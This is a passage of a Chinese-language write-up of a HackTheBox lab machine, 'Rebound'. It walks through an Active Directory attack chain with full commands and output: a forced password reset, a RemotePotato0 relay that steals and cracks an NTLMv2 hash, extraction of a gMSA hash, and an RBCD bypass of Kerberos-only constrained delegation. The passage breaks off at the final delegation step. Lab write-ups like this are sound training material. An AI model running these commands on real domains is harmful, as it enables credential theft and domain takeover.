<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 bloodyAD.py -u oorend -p &#x27;1GR8t@$$4u&#x27; --dc-ip 10.10.11.231 -d rebound.htb --host dc01.rebound.htb set password winrm_svc Password@123 </span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>

<p>登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -u winrm_svc -p Password@123  -i dc01.rebound.htb</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; </span><br></pre></td></tr></table></figure>
<p>get User</p>
<h1 id="to-Root"><a href="#to-Root" class="headerlink" title="to Root"></a>to Root</h1><p>跑了下证书没问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; .\Certify.exe find /vulnerable</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ &#x27;__| __| |  _| | | |</span><br><span class="line"> | |___|  __/ |  | |_| | | | |_| |</span><br><span class="line">  \_____\___|_|   \__|_|_|  \__, |</span><br><span class="line">                             __/ |</span><br><span class="line">                            |___./</span><br><span class="line">  v1.0.0</span><br><span class="line"></span><br><span class="line">[*] Action: Find certificate templates</span><br><span class="line">[*] Using the search base &#x27;CN=Configuration,DC=rebound,DC=htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] Listing info about the Enterprise CA &#x27;rebound-DC01-CA&#x27;</span><br><span class="line"></span><br><span class="line">    Enterprise CA Name            : rebound-DC01-CA</span><br><span class="line">    DNS Hostname                  : dc01.rebound.htb</span><br><span class="line">    FullName                      : dc01.rebound.htb\rebound-DC01-CA</span><br><span class="line">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class="line">    Cert SubjectName              : CN=rebound-DC01-CA, DC=rebound, DC=htb</span><br><span class="line">    Cert Thumbprint               : 17125012B063D3072D92E009F60CBF074ABE805E</span><br><span class="line">    Cert Serial                   : 42467DADE6281F8846DC3B6CEE24740D</span><br><span class="line">    Cert Start Date               : 4/8/2023 6:55:49 AM</span><br><span class="line">    Cert End Date                 : 4/8/2122 7:05:49 AM</span><br><span class="line">    Cert Chain                    : CN=rebound-DC01-CA,DC=rebound,DC=htb</span><br><span class="line">    UserSpecifiedSAN              : Disabled</span><br><span class="line">    CA Permissions                :</span><br><span class="line">      Owner: BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line"></span><br><span class="line">      Access Rights                                     Principal</span><br><span class="line"></span><br><span class="line">      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line">      Allow  ManageCA, ManageCertificates               rebound\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512</span><br><span class="line">      Allow  ManageCA, ManageCertificates               rebound\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519</span><br><span class="line">    Enrollment Agent Restrictions : None</span><br><span class="line"></span><br><span class="line">[+] No Vulnerable Certificates Templates found!</span><br></pre></td></tr></table></figure>

<p>好处是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; get-process</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName</span><br><span class="line">-------  ------    -----      -----     ------     --  -- -----------</span><br><span class="line">...</span><br><span class="line">    285      12     2604      12872               556   1 winlogon</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>有个winlogon，说明有用户正在当前服务器使用会话</p>
<p>可以看下当前有哪些用户正在会话，用<code>RunasCs</code>是因为winrm直接看好像没权限似的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documen.\RunasCs.exe winrm_svc Password@123 qwinsta -l 9</span><br><span class="line"></span><br><span class="line"> SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE</span><br><span class="line">&gt;services                                    0  Disc</span><br><span class="line"> console           tbrady                    1  Active</span><br></pre></td></tr></table></figure>

<p>这里可以用<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RemotePotato0"><code>remotepotato</code></a></p>
<p>我们拿<code>tbrady</code>的ntlmv2hash就好，所以就用mode2</p>
<blockquote>
<p>Module 2 - Rpc capture (hash) server + potato trigger</p>
<p>.\RemotePotato0.exe -m 2 -s 1</p>
</blockquote>
<p>因为他必须发送至一个135端口，而后再转发到🥔在服务器本机的起的<code>Oxid</code>端口（默认9999）</p>
<p>因为当前靶机服务器的135端口已经被rpc已经占用了，所以这里发往我们自己的135，再转发到靶机的9999</p>
<p>起一下转发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999</span><br></pre></td></tr></table></figure>

<p>在服务器上指定要获取hash用户的会话id,这里<code>tbrady</code>的id是1，因为他135冲突了所以启用远程<code>Oxid Resolver</code>用我们本地来转回它本地9999。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; .\RemotePotato0.exe -m 2 -s 1 -x 10.10.16.8</span><br><span class="line">[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999</span><br><span class="line">[*] Example Network redirector:</span><br><span class="line">        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&#123;&#123;ThisMachineIp&#125;&#125;:9999</span><br><span class="line">[*] Starting the RPC server to capture the credentials hash from the user authentication!!</span><br><span class="line">[*] Spawning COM object in the session: 1</span><br><span class="line">[*] Calling StandardGetInstanceFromIStorage with CLSID:&#123;5167B42F-C111-47A1-ACC4-8EABE61B0B54&#125;</span><br><span class="line">[*] RPC relay server listening on port 9997 ...</span><br><span class="line">[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...</span><br><span class="line">[*] IStoragetrigger written: 102 bytes</span><br><span class="line">[*] ServerAlive2 RPC Call</span><br><span class="line">[*] ResolveOxid2 RPC call</span><br><span class="line">[+] Received the relayed authentication on the RPC relay server on port 9997</span><br><span class="line">[*] Connected to RPC Server 127.0.0.1 on port 9999</span><br><span class="line">[+] User hash stolen!</span><br><span class="line"></span><br><span class="line">NTLMv2 Client   : DC01</span><br><span class="line">NTLMv2 Username : rebound\tbrady</span><br><span class="line">NTLMv2 Hash     : tbrady::rebound:79462e4cb5ae6e77:68a21f51060084bc500d4ea8c41e7c78:01010000000000008016aa01e64bdb01fcc8e616b4ba6afa0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e00680074006200070008008016aa01e64bdb01060004000600000008003000300000000000000001000000002000003649acf65b79e33a110b152e1f5606c67ca238e2dc9d4661b59a9a4bd1a3ae630a00100000000000000000000000000000000000090000000000000000000000</span><br></pre></td></tr></table></figure>

<p>拿到hash跑出密码<code>543BOMBOMBUNmanda</code></p>
<p>看下<code>tbrady</code>的权限，有对<code>DELEGATORS</code>的<code>readGmsapassword</code>权限</p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-9.png" alt="alt text"></p>
<p>bloodyad读<code>DELEGATORS$</code>的<code>msDS-ManagedPassword</code>属性拿nt就好</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 bloodyAD.py -u TBRADY -p <span class="string">&#x27;543BOMBOMBUNmanda&#x27;</span> --dc-ip 10.10.11.231 -d rebound.htb --host dc01.rebound.htb get object <span class="string">&#x27;delegator$&#x27;</span> --attr msDS-ManagedPassword</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb</span><br><span class="line">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:4ba33add1108fe560429fc27a1bcab6b</span><br><span class="line">msDS-ManagedPassword.B64ENCODED: NikXxFjQpBQrJqGAoSwQfOJIcS4wKNsur+HWUgv8o4fs6tlKg8aqiw1hINqtW2YwYl8Z1aO6AMsosv4kx81YKfH7AuhmB+vzCKB4VyXKmtEx390JWrBXHcNKcxlygf8Urs3g+RNlodOEx0FDGsoFRZ1Lq1nJetOTSLVY/sVm4q/jHbWxsmCsXenE6XK5a8z5q3yD6Mx4Ho3CdnVB110Ac24SxV1t+tKPsZ1Q1bbhhF7bf37jTiz9v6hsSZVNWgmxfDPg02n1oaViqh+XRdZnLtEs6i5O3HiAEtWYJdjEm0Qc2DCSupQRA5HSeZ51mEauBRRHyUhIjZeAuGckCFyYew==</span><br></pre></td></tr></table></figure>

<p>然后是<code>DELEGATORS</code>的路，可以看到是有约束委派</p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-10.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">pwdLastSet                        : 04/08/2023</span><br><span class="line">primaryGroupID                    : 515</span><br><span class="line">objectSid                         : S-1-5-21-4078382237-1492182817-2568127209-7687</span><br><span class="line">accountExpires                    : 9223372036854775807</span><br><span class="line">logonCount                        : 14</span><br><span class="line">sAMAccountName                    : delegator$</span><br><span class="line">sAMAccountType                    : 805306369</span><br><span class="line">dNSHostName                       : gmsa.rebound.htb</span><br><span class="line">servicePrincipalName              : browser/dc01.rebound.htb</span><br><span class="line">objectCategory                    : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb</span><br><span class="line">isCriticalSystemObject            : FALSE</span><br><span class="line">dSCorePropagationData             : 16010101000000.0Z</span><br><span class="line">lastLogonTimestamp                : 04/08/2023</span><br><span class="line">msDS-AllowedToDelegateTo          : http/dc01.rebound.htb</span><br><span class="line">msDS-SupportedEncryptionTypes     : RC4-HMAC</span><br><span class="line">                                    AES128</span><br><span class="line">                                    AES256</span><br><span class="line">msDS-ManagedPasswordId            : AQAAAEtEU0sCAAAAaQEAAA8AAAAGAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAA</span><br><span class="line">                                    AHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==</span><br><span class="line">msDS-ManagedPasswordInterval      : 30</span><br><span class="line">msDS-GroupMSAMembership           : S-1-5-21-4078382237-1492182817-2568127209-7686</span><br></pre></td></tr></table></figure>

<p>可以看到配了<code>DELEGATORS</code>的<code>msDS-AllowedToDelegateTo</code>配置为<code>http/dc01.rebound.htb</code>，一个常见的约束委派</p>
<p>那正常情况下我们可以直接在这里进行st的请求伪造<code>administrator</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-getST -dc-ip 10.10.11.231 -spn &#x27;http/dc01.rebound.htb&#x27; -impersonate administrator &#x27;rebound.htb/DELEGATOR$&#x27; -hashes  :4ba33add1108fe560429fc27a1bcab6b</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT for user</span><br><span class="line">[*] Impersonating administrator</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)</span><br><span class="line">[-] Probably SPN is not allowed to delegate by user DELEGATOR$ or initial TGT not forwardable</span><br></pre></td></tr></table></figure>

<p>但是这里在s4u2Self返回的st显示不可转发</p>
<p>这是因为<code>administrator</code>的uac被配置了<code>NOT_DELEGATED</code>也就是<code>用户不可委派</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PV &gt; Get-DomainObject -Identity administrator                                                                                                        </span><br><span class="line">objectClass                : top                                                                                                                     </span><br><span class="line">                             person                                                                                                                  </span><br><span class="line">                             organizationalPerson                                                                                                    </span><br><span class="line">                             user                                                                                                                    </span><br><span class="line">cn                         : Administrator                                                                                                           </span><br><span class="line">description                : Built-in account for administering the computer/domain                                                                  </span><br><span class="line">distinguishedName          : CN=Administrator,CN=Users,DC=rebound,DC=htb                                                                             </span><br><span class="line">instanceType               : 4                                                                                                                       </span><br><span class="line">whenCreated                : 20230407140141.0Z                                                                                                       </span><br><span class="line">whenChanged                : 20241213142558.0Z</span><br><span class="line">uSNCreated                 : 8196</span><br><span class="line">memberOf                   : CN=Group Policy Creator Owners,CN=Users,DC=rebound,DC=htb</span><br><span class="line">                             CN=Domain Admins,CN=Users,DC=rebound,DC=htb</span><br><span class="line">                             CN=Enterprise Admins,CN=Users,DC=rebound,DC=htb</span><br><span class="line">                             CN=Schema Admins,CN=Users,DC=rebound,DC=htb</span><br><span class="line">                             CN=Administrators,CN=Builtin,DC=rebound,DC=htb</span><br><span class="line">uSNChanged                 : 172080</span><br><span class="line">name                       : Administrator</span><br><span class="line">objectGUID                 : &#123;37857665-6e2e-4f12-9976-5c9babcd8282&#125;</span><br><span class="line">userAccountControl         : NORMAL_ACCOUNT [1114624]</span><br><span class="line">                             DONT_EXPIRE_PASSWORD</span><br><span class="line">                             NOT_DELEGATED</span><br></pre></td></tr></table></figure>

<p>这时我们可以再尝试<code>DC01$</code>，很遗憾也是不行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-getST -dc-ip 10.10.11.231 -spn &#x27;http/dc01.rebound.htb&#x27; -impersonate &#x27;dc01$&#x27; &#x27;rebound.htb/DELEGATOR$&#x27; -hashes  :4ba33add1108fe560429fc27a1bcab6b</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT for user</span><br><span class="line">[*] Impersonating dc01$</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)</span><br><span class="line">[-] Probably SPN is not allowed to delegate by user DELEGATOR$ or initial TGT not forwardable</span><br></pre></td></tr></table></figure>

<p>看下票据信息，能看到Flags那并没有带转发位，这种情况一般是开了<code>kerberos only</code>也就是我们所说的<code>protocol transition</code>被禁了，以导致<code>s4u2Self</code>拿到的st不可转发。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 .venv/bin/describeTicket.py dc01\$@DELEGATOR\$@REBOUND.HTB.ccache                                                  </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra                                                                                                        </span><br><span class="line"></span><br><span class="line">[*] Number of credentials in cache: 1 </span><br><span class="line">[*] Parsing credential[0]:</span><br><span class="line">[*] Ticket Session Key            : 3e8d0cbbe2293a5ffbe7ae367d7af6ab</span><br><span class="line">[*] User Name                     : dc01$</span><br><span class="line">[*] User Realm                    : rebound.htb</span><br><span class="line">[*] Service Name                  : DELEGATOR$</span><br><span class="line">[*] Service Realm                 : REBOUND.HTB</span><br><span class="line">[*] Start Time                    : 13/12/2024 13:16:53 PM</span><br><span class="line">[*] End Time                      : 13/12/2024 23:16:52 PM</span><br><span class="line">[*] RenewTill                     : 14/12/2024 13:16:41 PM</span><br><span class="line">[*] Flags                         : (0xa10000) renewable, pre_authent, enc_pa_rep</span><br></pre></td></tr></table></figure>

<p>同时<code>s4u2proxy</code>阶段所使用的<code>st</code>是必须要允许转发的，所以失败了。</p>
<p>那这种情况下我们考虑需要绕过<code>kerberos only</code></p>
<blockquote>
<p>这里可以参考下文</p>
<p><strong><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition">https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition</a></strong></p>
</blockquote>
<p>简述一下就是，可以通过<code>rbcd</code>来制作一个可转发的票据，再拿着这个票据去做<code>S4U2proxy</code></p>
<blockquote>
<p>这部分第一次接触可能会有疑问，<em>他<code>kerberos only</code>那<code>s4u2self</code>返回的是不可转发的st，那这个rbcd的s4u2proxy部分是不是也会G掉？</em></p>
</blockquote>
<p>确实这里<code>s4u2self</code>环节返回的<code>st</code>是不可转发的</p>
<p>但是<code>rbcd（基于资源的约束委派）</code>的<code>s4u2proxy</code>不同于<code>约束委派(CD)</code>环节的<code>S4u2proxy</code>，如下图</p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-11.png" alt="alt text"></p>
<p><code>s4u2self</code>返回不可转发st的情况下，如果是<code>rbcd</code>则仍然可以<code>S4U2Proxy</code></p>
<p>这里只有<code>DELEGATOR$</code>对<code>DC01</code>的<code>http/</code>有约束委派，所以rbcd需要要获取<code>DELEGATOR$</code>所对应的<code>spn</code>返回的可转发<code>st</code>，再拿着这个可转发的<code>st</code>去对<code>dc01</code>的服务做<code>CD(约束委派)</code>的<code>S4U2proxy</code>部分。</p>
<p>这样就满足这里单协议约束委派的条件：</p>
<ul>
<li>1.<code>S4U2proxy</code>阶段需要可转发<code>st</code></li>
<li>2.由被配置了<code>AllowedToDelegateTo</code>的账户，发起委派至<code>AllowedToDelegateTo</code>指向的目标。</li>
</ul>
<p>所以我们先创造有一个委派目标是<code>DELEGATOR</code>的服务的<code>rbcd</code></p>
<p>我们将<code>DELEGATOR</code>视为<code>ServiceA</code>，还需要一个ServiceB来发起委派。</p>
<p>此时serviceB账户需要满足</p>
<ul>
<li>1.有配置<code>spn</code></li>
<li>2.可以被我们控制（可以使用它发起委派请求）</li>
</ul>
<p>这个域中的<code>ldap_monitor</code>用户完美契合我们的两个要求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SAMAccountName:ldap_monitor</span><br><span class="line">servicePrincipalName:servicePrincipalName</span><br></pre></td></tr></table></figure>

<h2 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h2><p>首先用<code>DELEGATOR$</code>账户，给它自己加一下允许来自<code>ldap_monitor</code>的委派</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-rbcd  &#x27;rebound.htb/delegator$&#x27; -delegate-to &#x27;delegator$&#x27; -delegate-from ldap_monitor -use-ldaps -action write -k -no-pass -dc-ip 10.10.11.231</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class="line">[*] Delegation rights modified successfully!</span><br><span class="line">[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy</span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)</span><br></pre></td></tr></table></figure>

<p>这样<code>DELEGATOR$</code>的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性就添加了<code>ldap_monitor</code>的sid，允许了来自<code>ldap_monitor</code>的<code>rbcd</code>。</p>
<blockquote>
<p>以防如果之前没了解过cd和rbcd区别，所以再赘述一下，CD是在由<code>管理员</code>在发起委派的账户上配置<code>AllowedToDelegateTo</code>,来决定这个<code>账户允许委派至哪个服务</code>。</p>
<p>而RBCD是，可以由<code>服务账户自己</code>配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>来决定<code>谁可以向我发起委派</code>。</p>
</blockquote>
<p>此时再查询，新增了<code>DELEGATOR$</code>允许了来自<code>ldap_monitor</code>的rbcd委派请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-findDelegation &#x27;rebound.htb/delegator$&#x27; -dc-ip 10.10.11.231 -k  -no-pass</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting machine hostnameldapmonitor/dc01.rebound.htb</span><br><span class="line">AccountName   AccountType                          DelegationType              DelegationRightsTo    </span><br><span class="line">------------  -----------------------------------  --------------------------  ---------------------</span><br><span class="line">ldap_monitor  Person                               Resource-Based Constrained  delegator$            </span><br><span class="line">delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb </span><br></pre></td></tr></table></figure>

<p>看下<code>DELEGATOR$</code>的spn用来发起rbcd请求，这里是<code>browser/dc01.rebound.htb</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sAMAccountName                     : delegator$</span><br><span class="line">sAMAccountType                     : 805306369</span><br><span class="line">dNSHostName                        : gmsa.rebound.htb</span><br><span class="line">servicePrincipalName               : browser/dc01.rebound.htb</span><br><span class="line">objectCategory                     : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb</span><br><span class="line">isCriticalSystemObject             : FALSE</span><br><span class="line">dSCorePropagationData              : 16010101000000.0Z</span><br><span class="line">lastLogonTimestamp                 : 12/13/2024</span><br><span class="line">msDS-AllowedToDelegateTo           : http/dc01.rebound.htb</span><br></pre></td></tr></table></figure>

<p>伪造<code>DC01$</code>用户发起从<code>ldap_monitor</code>至<code>DELEGATOR$</code>服务的rbcd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-getST -spn &#x27;browser/dc01.rebound.htb&#x27; -impersonate &#x27;dc01$&#x27; -dc-ip 10.10.11.231 &#x27;rebound.htb/ldap_monitor&#x27; -k -no-pass</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Impersonating dc01$</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket in dc01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache</span><br></pre></td></tr></table></figure>

<p>这样就拿到<code>DC01$</code>对于<code>DELEGATOR$</code>的<code>browser/dc01.rebound.htb</code>ST</p>
<p>看下这张票据的FLAGs情况，是有<code>forwardable</code>，这张st可以转发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 .venv/bin/describeTicket.py dc01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache                                     </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra                                                                                                        </span><br><span class="line">                                                                                                                                                     </span><br><span class="line">[*] Number of credentials in cache: 1                                                                                                                </span><br><span class="line">[*] Parsing credential[0]:</span><br><span class="line">[*] Ticket Session Key            : 99a0ee0562f3d1f56572743bdd853117</span><br><span class="line">[*] User Name                     : dc01$</span><br><span class="line">[*] User Realm                    : rebound.htb</span><br><span class="line">[*] Service Name                  : browser/dc01.rebound.htb</span><br><span class="line">[*] Service Realm                 : REBOUND.HTB</span><br><span class="line">[*] Start Time                    : 11/12/2024 16:44:55 PM</span><br><span class="line">[*] End Time                      : 12/12/2024 02:37:04 AM (expired)</span><br><span class="line">[*] RenewTill                     : 12/12/2024 16:37:04 PM (expired)</span><br><span class="line">[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep</span><br></pre></td></tr></table></figure>

<h2 id="CD"><a href="#CD" class="headerlink" title="CD"></a>CD</h2><p>接下来用这张可转发的ST发起，cd的后半段的<code>s4u2proxy</code></p>
<p>再看下<code>DELEGATOR$</code>的<code>msDS-AllowedToDelegateTo</code>，这决定了这张st张可以去请求<code>DC01</code>上的哪个spn</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msDS-AllowedToDelegateTo           : http/dc01.rebound.htb</span><br></pre></td></tr></table></figure>

